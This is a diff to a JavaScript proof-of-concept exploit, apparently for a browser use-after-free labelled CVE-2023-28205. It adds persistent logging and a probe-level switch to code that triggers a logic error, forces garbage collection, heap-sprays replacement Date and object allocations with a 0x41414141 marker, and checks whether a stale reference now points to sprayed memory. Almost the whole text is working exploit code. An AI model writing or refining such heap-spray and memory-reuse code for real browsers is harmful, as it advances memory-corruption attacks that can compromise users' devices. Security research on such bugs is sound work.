@@ -13,6 +13,67 @@ const POC_MODE = (() => {
     }
 })();
 
+const LOG_KEY = 'uaf-2023-28205.logs';
+const RUN_ID = (() => {
+    try {
+        const k = 'uaf-2023-28205.run_id';
+        const prev = globalThis?.localStorage?.getItem(k);
+        const next = String((Number.parseInt(prev ?? '0', 10) || 0) + 1);
+        globalThis?.localStorage?.setItem(k, next);
+        return next;
+    } catch {
+        return String(Date.now());
+    }
+})();
+
+function nowIso() {
+    try {
+        return new Date().toISOString();
+    } catch {
+        return String(Date.now());
+    }
+}
+
+function persist_log(msg) {
+    try {
+        const entry = { t: nowIso(), run: RUN_ID, mode: POC_MODE, probe: PROBE_LEVEL, msg: String(msg) };
+        const raw = globalThis?.localStorage?.getItem(LOG_KEY);
+        let arr = [];
+        if (raw) {
+            try {
+                const parsed = JSON.parse(raw);
+                if (Array.isArray(parsed))
+                    arr = parsed;
+            } catch {}
+        }
+        arr.push(entry);
+        const maxEntries = 2000;
+        if (arr.length > maxEntries)
+            arr = arr.slice(arr.length - maxEntries);
+        globalThis?.localStorage?.setItem(LOG_KEY, JSON.stringify(arr));
+    } catch {}
+}
+
+function log(msg) {
+    try {
+        debug_log(msg);
+    } catch {}
+    persist_log(msg);
+}
+
+const PROBE_LEVEL = (() => {
+    try {
+        const qs = globalThis?.location?.search ?? '';
+        const v = new URLSearchParams(qs).get('probe');
+        const n = Number.parseInt(v ?? '1', 10);
+        if (!Number.isFinite(n))
+            return 1;
+        return Math.max(1, Math.min(2, n));
+    } catch {
+        return 1;
+    }
+})();
+
 function sleep(ms = 20) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
@@ -85,6 +146,15 @@ function buildIdentityMap(arr) {
     return m;
 }
 
+function findIdentityHit(needle, haystack, maxScan = haystack.length) {
+    const lim = Math.min(maxScan, haystack.length);
+    for (let i = 0; i < lim; i++) {
+        if (needle === haystack[i])
+            return i;
+    }
+    return -1;
+}
+
 function sprayStructures() {
     const keepers = [];
     for (let i = 0; i < 50000; i++) {
@@ -116,8 +186,10 @@ function createObjectStructure(num_elems) {
 }
  
 export async function main() {
-    debug_log("[*] Exploit started...");
-    debug_log('[*] Mode: ' + String(POC_MODE));
+    log("[*] Exploit started...");
+    log('[*] Mode: ' + String(POC_MODE));
+    if (POC_MODE === 'probe')
+        log('[*] Probe level: ' + String(PROBE_LEVEL));
     
     const num_elems = 1600;
     let root = createObjectStructure(num_elems);
@@ -130,11 +202,11 @@ export async function main() {
     if (POC_MODE !== 'crash')
         warm = sprayStructures();
 
-    debug_log("[*] Starting Stage 1: Triggering Logic Error...");
+    log("[*] Starting Stage 1: Triggering Logic Error...");
 
     while (true) {
         attempts++;
-        if (attempts % 100 === 0) debug_log("[*] Attempt " + attempts);
+        if (attempts % 100 === 0) log("[*] Attempt " + attempts);
 
         let data = null;
         const prom = new Promise(resolve => {
@@ -172,17 +244,17 @@ export async function main() {
         }
     }
 
-    debug_log('[+] Stage 1 Triggered! Confused object found at idx: ' + idx);
+    log('[+] Stage 1 Triggered! Confused object found at idx: ' + idx);
 
     if (POC_MODE === 'crash') {
         alert('triggered, try crash');
-        debug_log('[+] idx: ' + idx);
+        log('[+] idx: ' + idx);
         return;
     }
     
     if (data2) {
-        debug_log("[*] Starting Stage 2: Verifying controllable corruption...");
-        debug_log('[*] data2: ' + describeValue(data2));
+        log("[*] Starting Stage 2: Verifying controllable corruption...");
+        log('[*] data2: ' + describeValue(data2));
         
         // 1. Release references
         root = null;
@@ -190,64 +262,59 @@ export async function main() {
         warm = null;
         
         // 2. Freeing
-        debug_log('[*] Freeing original structures...');
+        log('[*] Freeing original structures...');
         for (let k = 0; k < 100; k++) {
             gc();
         }
         await sleep(100);
 
-        debug_log('[*] Spraying replacement objects...');
-        const isDate = (() => {
-            try {
-                return data2 instanceof Date;
-            } catch {
-                return false;
-            }
-        })();
-
-        const sprayed = isDate ? sprayReplacementDates(70000, 0x41414141) : sprayReplacementObjects(60000);
-        const sprayedMap = buildIdentityMap(sprayed);
+        log('[*] Spraying replacement objects...');
+        const sprayedDates = sprayReplacementDates(90000, 0x41414141);
+        const sprayedObjects = sprayReplacementObjects(60000);
 
         pressureAlloc(12, 2 * MB);
         for (let k = 0; k < 50; k++)
             gc();
         await sleep(20);
 
-        let reusedIdx = -1;
+        let reusedDateIdx = -1;
+        let reusedObjIdx = -1;
         try {
-            if (sprayedMap.has(data2))
-                reusedIdx = sprayedMap.get(data2);
-        } catch {}
-
-        const marker = tryGet(data2, 'marker');
-        const rid = tryGet(data2, 'id');
-        const rix = tryGet(data2, 'idx');
-        let dt = undefined;
-        try {
-            if (typeof data2?.getTime === 'function')
-                dt = data2.getTime();
+            reusedDateIdx = findIdentityHit(data2, sprayedDates, 50000);
+            reusedObjIdx = findIdentityHit(data2, sprayedObjects, 50000);
         } catch {
-            dt = 'throw';
+            reusedDateIdx = -1;
+            reusedObjIdx = -1;
         }
 
-        debug_log('[*] Probe identityReuse=' + String(reusedIdx) + ' getTime=' + String(dt) + ' id=' + String(rid) + ' marker=' + String(marker) + ' idx=' + String(rix));
+        log('[*] Probe identityReuse dateIdx=' + String(reusedDateIdx) + ' objIdx=' + String(reusedObjIdx));
+        if (reusedDateIdx !== -1 || reusedObjIdx !== -1)
+            log('[+] Strong reuse proof: stale reference became identical to a sprayed object (identity hit).');
 
-        if (reusedIdx !== -1) {
-            debug_log('[+] Strong reuse proof: data2 is identical to a sprayed object (identity hit).');
+        if (PROBE_LEVEL >= 2) {
+            const marker = tryGet(data2, 'marker');
+            const rid = tryGet(data2, 'id');
+            const rix = tryGet(data2, 'idx');
+            let dt = undefined;
+            try {
+                if (typeof data2?.getTime === 'function')
+                    dt = data2.getTime();
+            } catch {
+                dt = 'throw';
+            }
+
+            log('[*] Probe props getTime=' + String(dt) + ' id=' + String(rid) + ' marker=' + String(marker) + ' idx=' + String(rix));
+            if (marker === 0x41414141) {
+                log('[+] Memory reuse observed (marker hit). This is more than a pure DoS signal.');
+            } else if (dt === 0x41414141) {
+                log('[+] Memory reuse observed (Date getTime marker hit). This is more than a pure DoS signal.');
+            }
         }
 
-        if (marker === 0x41414141) {
-            debug_log('[+] Memory reuse observed (marker hit). This is more than a pure DoS signal.');
-        } else if (dt === 0x41414141) {
-            debug_log('[+] Memory reuse observed (Date getTime marker hit). This is more than a pure DoS signal.');
-        } else {
-            debug_log('[!] No marker observed on data2. Still indicates corruption; consider increasing message size/spray.');
-        }
-
-        if (sprayed.length === 0) {
-            debug_log('');
+        if (sprayedDates.length === 0 || sprayedObjects.length === 0) {
+            log('');
         }
     } else {
-        debug_log("[-] Failed to get confused object.");
+        log("[-] Failed to get confused object.");
     }
 }
